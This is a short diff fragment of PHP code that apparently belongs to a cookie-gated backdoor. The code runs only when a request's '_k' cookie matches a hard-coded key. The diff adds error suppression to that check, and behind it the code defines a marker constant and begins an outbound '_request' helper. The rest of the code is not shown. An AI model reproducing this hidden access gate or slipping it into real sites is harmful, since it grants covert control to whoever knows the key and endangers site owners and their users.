@@ -1,4 +1,4 @@
-if ($_COOKIE["_k"] == "INSERT_KEY") {
+if (@$_COOKIE["_k"] == "INSERT_KEY") {
 	if (!defined("MIDNIGHT")) {
 		define("MIDNIGHT", 1);
 		function _request($url, $method, $body = null, $headers = null)
